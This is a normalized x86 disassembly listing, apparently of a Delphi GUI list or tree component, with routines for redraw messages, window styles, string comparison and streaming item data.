mov eax [ eax + 0x288 ]
call sub_3a7b21c
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
movzx edx [ eax + 0x2d8 ]
call sub_3ade854
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x288 ]
call sub_3a7b21c
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x0
push 0x0
push 0xb
mov eax [ ebp - 0x4 ]
call sub_3adabc0
push eax
call __imp_SendMessageA
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_3adceec
test al al
je r-xdata
inc esi
xor edi edi
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
xor eax eax
push ebp
push sub_3adae7e
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x1
push 0xb
mov eax [ ebp - 0x4 ]
call sub_3adabc0
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x80 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x0
retn
inc esi
xor edi edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_3adcef8
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov [ ebx + 0x20 ] eax
mov eax ebx
call sub_3ad9b9c
mov [ ebx + 0x24 ] eax
mov eax ebx
call sub_3ad9a38
inc edi
dec esi
jne r-xdata
mov edx eax
mov eax ebx
call sub_3ad9c1c
xor eax eax
mov [ ebx + 0x20 ] eax
push 0x0
push 0x0
push 0xb
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x2b0 ]
push eax
call SendMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x288 ]
mov edx edi
call sub_3ad9dc0
mov ebx eax
mov eax [ ebx + 0x24 ]
test eax eax
jge r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x288 ]
mov edx edi
call sub_3ad9dc0
mov ebx eax
mov eax [ ebx + 0x20 ]
test eax eax
jge r-xdata
sub_3adaed8
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov edx ebx
mov eax edi
call sub_3a7aad0
mov eax edi
call sub_3adacb4
mov ebp ebx
mov eax ebp
call sub_3adab94
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax ebp
call sub_3adabcc
push eax
mov eax edi
call sub_3adab2c
pop edx
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc esi
dec ebx
jne r-xdata
jmp r-xdata
sub_3adaf38
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + 0x20 ]
test edi edi
jne r-xdata
mov eax edi
call sub_3adab94
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_3adab94
cmp ebx eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_3adab94
test eax eax
setg bl
jmp r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_3adab94
dec eax
test eax eax
jl r-xdata
mov bl 0x1
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc eax
mov [ ebp - 0x4 ] eax
xor esi esi
inc esi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx esi
mov eax edi
call sub_3adabcc
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_3adabcc
pop edx
call sub_3ada9bc
mov ebx eax
xor bl 0x1
test bl bl
jne r-xdata
sub_3adafc8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_3a7abbc
mov eax [ ebp - 0x8 ]
push eax
push r-xdata
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
mov eax [ ebp - 0x8 ]
push eax
push sub_3adb248
mov eax [ ebp - 0x8 ]
push eax
push sub_3adb458
push ebp
call sub_3adaf38
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3adb04d
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffffd4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x28 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3adb238
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_3adacb4
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax ebx
call sub_3a7cdc8
mov eax [ ebp - 0xc ]
call sub_3a62ec8
mov [ ebp - 0x14 ] eax
xor ecx ecx
push ebp
push sub_3adb216
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov ecx [ ebp - 0xc ]
sub ecx 0x4
mov eax [ ebp - 0x14 ]
lea edx [ eax + 0x4 ]
mov eax ebx
call sub_3a7cdc8
mov eax [ ebp - 0x14 ]
add eax 0x8
mov [ ebp - 0x18 ] eax
xor ebx ebx
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x4 ]
dec eax
test eax eax
jl r-xdata
mov eax ebx
mov edx eax
sub edx [ ebp - 0x14 ]
cmp edx [ ebp - 0xc ]
jge r-xdata
inc eax
mov [ ebp - 0x1c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3adb21d
mov edi eax
mov eax [ ebp - 0x4 ]
call sub_3adab94
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x18 ]
movzx eax [ eax + 0x14 ]
add eax 0x15
add eax [ ebp - 0x10 ]
add [ ebp - 0x18 ] eax
dec [ ebp - 0x1c ]
jne r-xdata
inc esi
inc eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_3adab2c
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x28 ]
mov edx [ ebp - 0x18 ]
add edx 0x14
call sub_3a65504
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x20 ]
call sub_3ada5a8
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
xor edx edx
mov eax [ ebp - 0x20 ]
call sub_3ada76c
mov eax [ ebp - 0x18 ]
mov ecx [ eax + 0x8 ]
mov edx 0x1
mov eax [ ebp - 0x20 ]
call sub_3ada76c
mov eax [ ebp - 0x18 ]
mov ecx [ eax + 0x4 ]
mov edx 0x2
mov eax [ ebp - 0x20 ]
call sub_3ada76c
mov eax [ ebp - 0x18 ]
mov edx [ eax + 0x10 ]
mov eax [ ebp - 0x20 ]
call sub_3ada65c
mov eax [ ebp - 0x18 ]
lea ebx [ eax + 0x14 ]
movzx eax [ ebx ]
inc eax
add ebx eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x18 ]
mov esi [ eax + 0xc ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebp - 0x2c ]
mov edx ebx
call sub_3a65504
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
movzx eax [ ebx ]
lea edx [ eax + 0x1 ]
add [ ebp - 0x10 ] edx
add ebx edx
dec esi
jne r-xdata
inc [ ebp - 0x8 ]
dec [ ebp - 0x1c ]
jne r-xdata
inc esi
xor ebx ebx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_3adabcc
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
movsx ecx [ edi ]
mov edx ebx
mov eax [ ebp - 0x24 ]
call sub_3adaa50
add edi 0x2
inc ebx
dec esi
jne r-xdata
sub_3adb248
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_3adb431
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_3adacb4
lea edx [ ebp - 0x17 ]
mov ecx 0x1
mov eax esi
call sub_3a7cdc8
movzx eax [ ebp - 0x17 ]
cmp al [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3adb438
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_3a652c4
lea eax [ ebp - 0x4 ]
call sub_3a65a7c
retn
lea edx [ ebp - 0x10 ]
mov ecx 0x4
mov eax esi
call sub_3a7cdc8
lea edx [ ebp - 0x14 ]
mov ecx 0x4
mov eax esi
call sub_3a7cdc8
mov eax [ ebp - 0x14 ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_3adab94
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x1c ] eax
inc eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0xc ] 0x0
dec [ ebp - 0x1c ]
jne r-xdata
inc ebx
inc [ ebp - 0xc ]
dec [ ebp - 0x1c ]
jne r-xdata
inc ebx
xor edi edi
lea edx [ ebp - 0x35 ]
mov ecx 0x15
mov eax esi
call sub_3a7cdc8
mov eax [ ebp - 0x8 ]
call sub_3adab2c
mov edi eax
mov ecx [ ebp - 0x35 ]
xor edx edx
mov eax edi
call sub_3ada76c
mov ecx [ ebp - 0x2d ]
mov edx 0x1
mov eax edi
call sub_3ada76c
mov ecx [ ebp - 0x31 ]
mov edx 0x2
mov eax edi
call sub_3ada76c
mov edx [ ebp - 0x25 ]
mov eax edi
call sub_3ada65c
movzx edx [ ebp - 0x21 ]
lea eax [ ebp - 0x4 ]
call sub_3a65cd8
mov eax [ ebp - 0x4 ]
call sub_3a65bec
mov edx eax
movzx eax [ ebp - 0x21 ]
mov ecx eax
add ecx ecx
mov eax esi
call sub_3a7cdc8
lea eax [ ebp - 0x3c ]
mov edx [ ebp - 0x4 ]
call sub_3a65528
mov edx [ ebp - 0x3c ]
mov eax edi
call sub_3ada5a8
mov ebx [ ebp - 0x29 ]
dec ebx
test ebx ebx
jl r-xdata
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax esi
call sub_3a7cdc8
movzx edx [ ebp - 0x18 ]
lea eax [ ebp - 0x4 ]
call sub_3a65cd8
mov eax [ ebp - 0x4 ]
call sub_3a65bec
mov edx eax
movzx eax [ ebp - 0x18 ]
mov ecx eax
add ecx ecx
mov eax esi
call sub_3a7cdc8
lea eax [ ebp - 0x40 ]
mov edx [ ebp - 0x4 ]
call sub_3a65528
mov edx [ ebp - 0x40 ]
mov eax [ edi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
dec ebx
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_3adabcc
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
lea edx [ ebp - 0x16 ]
mov ecx 0x2
mov eax esi
call sub_3a7cdc8
movsx ecx [ ebp - 0x16 ]
mov edx edi
mov eax [ ebp - 0x20 ]
call sub_3adaa50
inc edi
dec ebx
jne r-xdata
sub_3adb458
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_3adb706
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
call sub_3adab94
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_3adab94
mov [ ebp - 0x20 ] eax
mov edx rw-data
mov ecx 0x1
mov eax [ ebp - 0xc ]
call sub_3a7ce00
lea edx [ ebp - 0x14 ]
mov ecx 0x4
mov eax [ ebp - 0xc ]
call sub_3a7ce00
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0xc ]
call sub_3a7ce00
mov eax [ ebp - 0x8 ]
call sub_3adab94
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x8 ]
call sub_3adab94
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x18 ]
add eax 0x15
add [ ebp - 0x14 ] eax
inc [ ebp - 0x10 ]
dec [ ebp - 0x28 ]
jne r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3adb70d
lea eax [ ebp - 0x4c ]
mov edx 0x2
call sub_3a652c4
lea eax [ ebp - 0x4 ]
call sub_3a65a7c
retn
inc eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x10 ] 0x0
movzx eax [ ebp - 0x24 ]
mov [ ebp - 0x2d ] al
lea edx [ ebp - 0x41 ]
mov ecx 0x15
mov eax [ ebp - 0xc ]
call sub_3a7ce00
mov eax [ ebp - 0x4 ]
call sub_3a65bec
mov edx eax
movzx eax [ ebp - 0x2d ]
mov ecx eax
add ecx ecx
mov eax [ ebp - 0xc ]
call sub_3a7ce00
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0x24 ] 0xff
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_3adabcc
mov eax [ eax + 0x24 ]
call sub_3adb440
inc eax
mov [ ebp - 0x18 ] eax
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_3adabcc
mov eax [ eax + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_3adabcc
mov eax [ eax + 0x8 ]
lea ecx [ ebp - 0x48 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x48 ]
call sub_3adb440
inc eax
add [ ebp - 0x18 ] eax
add [ ebp - 0x18 ] 0x2
inc esi
dec ebx
jne r-xdata
inc [ ebp - 0x10 ]
dec [ ebp - 0x28 ]
jne r-xdata
inc ebx
xor esi esi
inc [ ebp - 0x10 ]
dec [ ebp - 0x28 ]
jne r-xdata
inc ebx
xor esi esi
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_3adabcc
mov edi eax
mov eax [ edi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx esi
mov eax edi
call sub_3adaa44
mov [ ebp - 0x1a ] ax
lea edx [ ebp - 0x1a ]
mov ecx 0x2
mov eax [ ebp - 0xc ]
call sub_3a7ce00
inc esi
dec ebx
jne r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_3adabcc
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x41 ] eax
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x39 ] eax
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x3d ] eax
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x31 ] eax
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0x35 ] eax
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x2c ]
mov edx [ edx + 0x24 ]
call sub_3a65bdc
mov eax [ ebp - 0x4 ]
call sub_3a65bfc
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x24 ] 0xff
jle r-xdata
lea edx [ ebp - 0x24 ]
mov ecx 0x1
mov eax [ ebp - 0xc ]
call sub_3a7ce00
mov eax [ ebp - 0x4 ]
call sub_3a65bec
mov edx eax
mov ecx [ ebp - 0x24 ]
add ecx ecx
mov eax [ ebp - 0xc ]
call sub_3a7ce00
inc esi
dec ebx
jne r-xdata
mov [ ebp - 0x24 ] 0xff
lea ecx [ ebp - 0x4c ]
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x8 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x4c ]
lea eax [ ebp - 0x4 ]
call sub_3a65bdc
mov eax [ ebp - 0x4 ]
call sub_3a65bfc
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x24 ] 0xff
jle r-xdata
sub_3adb750
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_3a64350
test esi esi
jne r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov [ edi + 0x4 ] esi
xor edx edx
mov eax edi
call sub_3adb7c4
xor edx edx
mov eax edi
call sub_3adb7d8
mov dl 0x1
mov eax edi
call sub_3adb7ec
mov eax edi
test bl bl
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d3d4
call sub_3a64c34
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3adb800
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
mov eax ebx
call sub_3ada474
cmp [ eax + 0x33a ] 0x0
je r-xdata
mov eax [ esi + 0x24 ]
call sub_3a65730
push eax
mov eax [ ebx + 0x24 ]
call sub_3a65730
push eax
call lstrcmpA
mov [ ebp - 0x4 ] eax
push esi
mov eax [ ebp + 0x10 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_3ada474
mov esi eax
mov eax ebx
call sub_3ada474
mov edx eax
mov ecx ebx
mov eax [ esi + 0x33c ]
call [ esi + 0x338 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_3adb86c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_3ab29f0
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
or eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov edx 0xfa
mov eax ebx
call sub_3aaf278
mov edx 0x96
mov eax ebx
call sub_3aaf2ac
mov dl 0x1
mov eax ebx
call sub_3adcb18
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x138 ]
xor edx edx
mov eax ebx
call sub_3aafd7c
mov dl 0x1
mov eax ebx
call sub_3ab7f08
mov dl 0x1
mov eax ebx
call sub_3adcf44
mov dl 0x1
mov eax ebx
call sub_3adcb9c
mov dl 0x1
mov eax ebx
call sub_3adcb2c
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a89cb0
mov esi eax
mov [ ebx + 0x258 ] esi
mov eax esi
mov edx ebx
call sub_3aae42c
mov [ ebx + 0x2b8 ] 0xffffffff
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_3ad9d7c
mov [ ebx + 0x288 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10c ]
mov [ ebx + 0x278 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x108 ]
mov [ ebx + 0x2dc ] eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_3adb750
mov [ ebx + 0x280 ] eax
mov eax [ r-xdata ]
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a7b564
mov [ ebx + 0x2e0 ] eax
mov [ ebx + 0x2e4 ] 0x0
mov [ ebx + 0x2e5 ] 0x0
xor eax eax
mov [ ebx + 0x2f0 ] eax
mov [ ebx + 0x2c8 ] 0xffffffff
push 0x20
mov ecx 0x20
mov dl 0x1
mov eax [ r-xdata ]
call sub_3abe8d4
mov [ ebx + 0x270 ] eax
push ebx
push sub_3adc594
call sub_3a84724
mov [ ebx + 0x29c ] eax
push ebx
push sub_3adc344
call sub_3a84724
mov [ ebx + 0x2a8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov esi eax
mov [ ebx + 0x2cc ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_3adc08c
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov esi eax
mov [ ebx + 0x2d0 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_3adc08c
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov esi eax
mov [ ebx + 0x2d4 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_3adc08c
mov [ ebx + 0x264 ] 0xffffffff
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3adba68
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov eax esi
call sub_3ab7fd8
test al al
je r-xdata
mov eax [ esi + 0x270 ]
call sub_3a64380
mov eax [ esi + 0x288 ]
call sub_3a64380
mov eax [ esi + 0x2dc ]
call sub_3a64380
mov eax [ esi + 0x278 ]
call sub_3a64380
mov eax [ esi + 0x280 ]
call sub_3a64380
mov eax [ esi + 0x28c ]
call sub_3a64380
mov eax [ esi + 0x294 ]
call sub_3a64380
mov eax [ esi + 0x298 ]
call sub_3a64380
mov eax [ esi + 0x2e0 ]
call sub_3a64380
mov eax [ esi + 0x29c ]
call sub_3a847bc
mov eax [ esi + 0x2b0 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xb4 ]
mov eax [ esi + 0x2a8 ]
call sub_3a847bc
mov eax [ esi + 0x2cc ]
call sub_3a64380
mov eax [ esi + 0x2d0 ]
call sub_3a64380
mov eax [ esi + 0x2d4 ]
call sub_3a64380
mov eax [ esi + 0x258 ]
call sub_3a64380
xor eax eax
mov [ esi + 0x258 ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3ab2b34
test bl bl
jle r-xdata
mov edx [ esi + 0x2ac ]
push edx
push 0xfffffffc
push eax
call SetWindowLongA
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3adbb68
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
call sub_3ad82e0
mov edx esi
mov eax ebx
call sub_3ab3d30
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_3ab3c5c
mov edx [ esi + 0x4 ]
or edx 0x2000000
movzx ecx [ ebx + 0x25d ]
or edx [ ecx * 4 + rw-data ]
movzx ecx [ ebx + 0x25c ]
or edx [ ecx * 4 + rw-data ]
mov eax [ ebx + 0x280 ]
movzx ecx [ eax + 0x8 ]
or edx [ ecx * 4 + rw-data ]
movzx ecx [ ebx + 0x25e ]
or edx [ ecx * 4 + rw-data ]
movzx ecx [ ebx + 0x274 ]
or edx [ ecx * 4 + rw-data ]
movzx ecx [ ebx + 0x284 ]
or edx [ ecx * 4 + rw-data ]
movzx ecx [ eax + 0x9 ]
or edx [ ecx * 4 + rw-data ]
movzx eax [ eax + 0xa ]
or edx [ eax * 4 + rw-data ]
movzx eax [ ebx + 0x277 ]
or edx [ eax * 4 + rw-data ]
movzx eax [ ebx + 0x276 ]
or edx [ eax * 4 + rw-data ]
or edx 0x40
mov [ esi + 0x4 ] edx
cmp [ ebx + 0x290 ] 0x0
je r-xdata
cmp [ ebx + 0x291 ] 0x0
je r-xdata
or [ esi + 0x4 ] 0x1000
cmp [ ebx + 0x1d9 ] 0x0
je r-xdata
or [ esi + 0x4 ] 0x400
and [ esi + 0x24 ] 0xfffffffc
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebx + 0x25c ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_3adbc88
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x294 ] 0x0
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x288 ]
call sub_3a7b178
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ eax + 0x294 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a7d714
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3adbd10
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_3a7ff4c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x288 ]
mov eax [ ebp - 0x4 ]
call sub_3a7e53c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a64380
retn
sub_3adbd3c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_3ab3e5c
mov eax [ ebp - 0x4 ]
call sub_3adc794
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0x4 ]
call sub_3adcbdc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_3adcbb0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x2b4 ]
mov eax [ ebp - 0x4 ]
call sub_3adcc28
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x2c8 ]
mov eax [ ebp - 0x4 ]
call sub_3adfa5c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
call sub_3ad9e10
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x260 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
call sub_3adace0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2d9 ] 0x1
xor eax eax
push ebp
push sub_3adbeae
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
call sub_3a7b178
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28c ]
mov edx [ ebp - 0x4 ]
call sub_3a7cf2c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x28c ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x290 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x268 ]
test ebx ebx
je r-xdata
mov eax ebx
call sub_3abea4c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c0 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x2f0 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
call sub_3adac80
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x26c ]
test ebx ebx
je r-xdata
mov eax ebx
call sub_3abea4c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x260 ]
call sub_3abec10
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_3adc05c
push ebp
call sub_3adbc88
pop ecx
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
call sub_3aafc7c
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x264 ]
cmp ebx 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_3adc89c
mov eax [ ebp - 0x4 ]
call sub_3adf160
call sub_3abdd24
call sub_3abde2c
test al al
je r-xdata
mov eax ebx
call sub_3abea4c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
call sub_3abec10
mov edx eax
